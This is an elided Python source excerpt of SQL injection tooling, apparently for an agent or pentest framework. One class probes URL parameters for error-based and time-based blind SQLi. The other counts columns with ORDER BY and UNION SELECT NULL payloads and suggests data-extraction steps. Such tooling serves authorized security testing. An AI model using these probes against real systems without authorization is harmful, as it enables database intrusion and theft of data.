...
class SqliProbeTool:
    ...
    def _get_payloads(
        self, payload_set: str, custom_payloads: Optional[List[str]] = None
    ) -> List[str]:
    ...
    def use(self, tool_input: str) -> str:
                ...
                interesting_payloads.append(
                    {
                        ...
                        "length": 0,
                        "reasons": [
                            "Request timed out - possible time-based blind SQLi"
                        ],
                    }
                )
            except Exception as exc:
        ...
        # Build summary
        output_lines = [
            "[SqliProbeTool] SQL Injection Probe Results",
            "=" * 50,
            f"Target: {url}",
            f"Method: {method}",
            f"Parameter: {param}",
        ...
        if interesting_payloads:
            output_lines.append(
                f"INTERESTING PAYLOADS ({len(interesting_payloads)} found):"
            )
            ...
            output_lines.append(
                "Consider trying a different payload set or manual testing."
            )
            output_lines.append("")
        ...
        if errors_detected:
            ...
            output_lines.append(
                "  - Consider using UNION-based injection for data extraction."
            )
        ...
        if not errors_detected and not successes_detected:
            output_lines.append(
                "  - No clear vulnerabilities detected with this payload set."
            )
            output_lines.append("  - Try error_based or union_detect payload sets.")
            output_lines.append(
                "  - Consider blind SQL injection testing with timing analysis."
            )
...
class SqliColumnCounter:
    ...
    def use(self, tool_input: str) -> str:
        ...
        output_lines = [
            "[SqliColumnCounter] Column Count Detection",
            "=" * 50,
            f"Target: {url}",
            f"Parameter: {param}",
        ...
        if technique == "order_by":
            ...
            for col_num in range(1, max_columns + 1):
                ...
                try:
                    ...
                    if has_error or resp.status_code >= 400:
                        ...
                        output_lines.append(
                            f"  ORDER BY {col_num}: FAILED (error detected)"
                        )
                        break
                    else:
            ...
            if last_success > 0:
                ...
                output_lines.append(
                    f"  ORDER BY {last_success} succeeded, ORDER BY {first_failure} failed"
                )
            else:
                output_lines.append("")
                output_lines.append("RESULT: Could not determine column count")
                output_lines.append(
                    "  Try adjusting prefix/suffix or using union_null technique"
                )
            ...
            for col_num in range(1, max_columns + 1):
                ...
                try:
                    ...
                    if not has_error and resp.status_code < 400:
                        ...
                        if (
                            length_diff < baseline_length * 0.5
                            ...
                            output_lines.append(
                                f"  UNION SELECT {nulls}: OK (length diff: {length_diff})"
                            )
                    else:
                    ...
                    output_lines.append(
                        f"  UNION SELECT ({col_num} NULLs): Error - {exc}"
                    )
            ...
            if found_columns > 0:
                ...
                output_lines.append(
                    f"  1. Use: ' UNION SELECT {', '.join(['NULL']*found_columns)} --"
                )
                output_lines.append(
                    "  2. Replace NULLs with column values to extract data"
                )
                output_lines.append(
                    "  3. Try: ' UNION SELECT 1,2,3,... to find visible columns"
                )
            else:
                output_lines.append("")
                output_lines.append("RESULT: Could not determine column count")
                output_lines.append(
                    "  Try adjusting prefix/suffix or different technique"
                )
